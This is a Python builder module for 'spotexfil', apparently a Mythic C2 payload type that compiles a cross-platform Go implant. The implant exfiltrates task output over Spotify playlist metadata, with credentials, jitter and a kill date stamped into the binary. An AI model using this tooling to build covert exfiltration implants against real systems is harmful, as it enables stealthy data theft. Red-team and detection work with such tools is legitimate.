from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicGoRPC import *
from mythic_container.logging import logger
import asyncio
import os
import pathlib
import shutil
import tempfile


class spotexfil(PayloadType):
    name = "spotexfil"
    file_extension = "bin"
    author = "@sourcefrenchy"
    supported_os = [SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS]
    wrapper = False
    wrapped_payloads = []
    note = ("Cross-platform Go implant that exfiltrates task output over the "
            "Spotify Web API (playlist metadata) via the 'spotify' C2 profile. "
            "All configuration (Spotify app credentials, transport passphrase, "
            "timers) is stamped into the binary at build time via -ldflags -X.")
    supports_dynamic_loading = False
    mythic_encrypts = True
    c2_profiles = ["spotify"]
    supports_multiple_c2_in_build = False
    agent_path = pathlib.Path(".") / "spotexfil"
    # The agent's Go module (<repo>/go, module github.com/sourcefrenchy/spotexfil)
    # is staged into ./agent_code before the container image is built
    # (see install.sh / README.md).
    agent_code_path = pathlib.Path(".") / "agent_code"
    build_steps = [
        BuildStep(
            step_name="Gather Source",
            step_description="Copying the Go agent module into a temporary build directory"),
        BuildStep(
            step_name="Configure",
            step_description="Resolving build parameters and spotify C2 profile settings into Go -ldflags -X stamps"),
        BuildStep(
            step_name="Compile",
            step_description="Cross-compiling go/cmd/mythicagent with `go build -tags implantonly`"),
    ]
    build_parameters = [
        BuildParameter(
            name="target_os",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target platform for the compiled agent binary.",
            choices=["darwin-arm64", "darwin-amd64", "linux-amd64", "windows-amd64"],
            default_value="darwin-arm64",
            ui_position=0,
        ),
        BuildParameter(
            name="interval",
            parameter_type=BuildParameterType.Number,
            description="Seconds between Spotify polls (check-ins). Keep >= 20 to stay clear of Spotify API rate limits.",
            default_value=30,
            verifier_regex="^[0-9]+$",
            ui_position=1,
        ),
        BuildParameter(
            name="jitter",
            parameter_type=BuildParameterType.Number,
            description="Jitter percentage applied to the poll interval (0-100).",
            default_value=10,
            verifier_regex="^([0-9]|[1-9][0-9]|100)$",
            ui_position=2,
        ),
        BuildParameter(
            name="killdate",
            parameter_type=BuildParameterType.Date,
            description="Optional kill date (YYYY-MM-DD); the agent exits after this date. Leave empty for no kill date.",
            required=False,
            ui_position=3,
        ),
        BuildParameter(
            name="passphrase",
            parameter_type=BuildParameterType.String,
            description="Shared transport passphrase protecting the cmd/res playlists. MUST exactly match the "
                        "'passphrase' parameter of the spotify C2 profile instance used with this payload.",
            required=True,
            ui_position=4,
        ),
        BuildParameter(
            name="username",
            parameter_type=BuildParameterType.String,
            description="Spotify account username that owns the C2 playlists.",
            required=True,
            ui_position=5,
        ),
        BuildParameter(
            name="client_id",
            parameter_type=BuildParameterType.String,
            description="Spotify Developer app client ID.",
            required=True,
            ui_position=6,
        ),
        BuildParameter(
            name="client_secret",
            parameter_type=BuildParameterType.String,
            description="Spotify Developer app client secret.",
            required=True,
            ui_position=7,
        ),
        BuildParameter(
            name="redirect_uri",
            parameter_type=BuildParameterType.String,
            description="OAuth redirect URI registered on the Spotify Developer app.",
            required=False,
            default_value="http://127.0.0.1:8888/callback",
            ui_position=8,
        ),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)
        try:
            # --- Validate the selected C2 profile ---------------------------
            if len(self.c2info) != 1:
                resp.build_stderr = "spotexfil requires exactly one C2 profile (spotify)"
                return resp
            c2 = self.c2info[0]
            profile_name = c2.get_c2profile()["name"]
            if profile_name not in self.c2_profiles:
                resp.build_stderr = f"Invalid C2 profile for spotexfil: {profile_name}"
                return resp

            # --- Configure: resolve parameters into -ldflags stamps ---------
            c2_params = c2.get_parameters_dict()

            # The profile's AESPSK parameter is a crypto_type parameter: Mythic
            # hands it to the builder as a dict with the generated key material.
            # Wire it into the agent's AESKeyB64; empty when "none" is selected.
            aes_key_b64 = ""
            aespsk = c2_params.get("AESPSK")
            if isinstance(aespsk, dict):
                if aespsk.get("value") != "none":
                    aes_key_b64 = aespsk.get("enc_key") or ""
            elif isinstance(aespsk, str) and aespsk not in ("", "none"):
                aes_key_b64 = aespsk

            target = self.get_parameter("target_os")
            goos, goarch = target.split("-")

            killdate = self.get_parameter("killdate") or ""
            interval = self.get_parameter("interval")
            jitter = self.get_parameter("jitter")
            passphrase = self.get_parameter("passphrase") or ""
            username = self.get_parameter("username") or ""
            client_id = self.get_parameter("client_id") or ""
            client_secret = self.get_parameter("client_secret") or ""
            redirect_uri = self.get_parameter("redirect_uri") or "http://127.0.0.1:8888/callback"

            warn = ""
            profile_passphrase = c2_params.get("passphrase")
            if profile_passphrase and profile_passphrase != passphrase:
                warn = ("\n[WARNING] the build 'passphrase' does not match the spotify profile's "
                        "'passphrase' parameter; the agent will NOT be able to read the transport "
                        "channels unless they are identical.\n")

            ldflag_pairs = [
                ("main.PayloadUUID", self.uuid),
                ("main.AESKeyB64", aes_key_b64),
                ("main.Passphrase", passphrase),
                ("main.SpotifyUsername", username),
                ("main.SpotifyClientID", client_id),
                ("main.SpotifyClientSecret", client_secret),
                ("main.SpotifyRedirectURI", redirect_uri),
                ("main.SpotifyTokenFile", ""),
                ("main.Interval", str(interval)),
                ("main.Jitter", str(jitter)),
                ("main.KillDate", killdate),
            ]
            ldflags = "-s -w " + " ".join(f"-X {k}={v}" for k, v in ldflag_pairs)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configure",
                StepStdout=f"target={target}, interval={interval}s, jitter={jitter}%, "
                           f"killdate='{killdate}', AESKeyB64={'set' if aes_key_b64 else 'empty (crypto=none)'}",
                StepSuccess=True,
            ))

            # --- Gather Source ----------------------------------------------
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            shutil.copytree(self.agent_code_path, agent_build_path.name, dirs_exist_ok=True)
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gather Source",
                StepStdout=f"Copied Go module from {self.agent_code_path} to {agent_build_path.name}",
                StepSuccess=True,
            ))

            # --- Compile -----------------------------------------------------
            output_name = "spotexfil.exe" if goos == "windows" else "spotexfil"
            output_path = os.path.join(agent_build_path.name, output_name)
            build_env = {
                **os.environ,
                "GOOS": goos,
                "GOARCH": goarch,
                "CGO_ENABLED": "0",
                "GOTOOLCHAIN": "auto",
            }
            # Exec form (no shell) so stamped credentials cannot break quoting.
            command_args = [
                "go", "build",
                "-tags", "implantonly",
                "-trimpath",
                "-ldflags", ldflags,
                "-o", output_path,
                "./cmd/mythicagent",
            ]
            proc = await asyncio.create_subprocess_exec(
                *command_args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path.name,
                env=build_env,
            )
            stdout, stderr = await proc.communicate()
            if stdout:
                resp.build_stdout += f"\n[STDOUT]\n{stdout.decode()}"
            if stderr:
                resp.build_stderr += f"\n[STDERR]\n{stderr.decode()}"

            if proc.returncode != 0 or not os.path.exists(output_path):
                resp.build_stderr += f"\n`go build` exited with {proc.returncode}; expected output {output_path}"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compile",
                    StepStderr=f"go build failed (exit {proc.returncode})",
                    StepSuccess=False,
                ))
                return resp

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compile",
                StepStdout=f"Compiled {output_name} ({os.path.getsize(output_path)} bytes) for {target}",
                StepSuccess=True,
            ))

            with open(output_path, "rb") as f:
                resp.payload = f.read()
            if goos == "windows":
                resp.updated_filename = f"{self.filename}.exe"
            resp.build_message += (warn +
                                   f"\nCreated spotexfil payload!\n"
                                   f"Target: {target}, Interval: {interval}s, Jitter: {jitter}%, "
                                   f"KillDate: {killdate or 'none'}, C2 Profile: {profile_name}\n")
            resp.status = BuildStatus.Success
            return resp
        except Exception as e:
            resp.build_stderr += "\n" + str(e)
        return resp
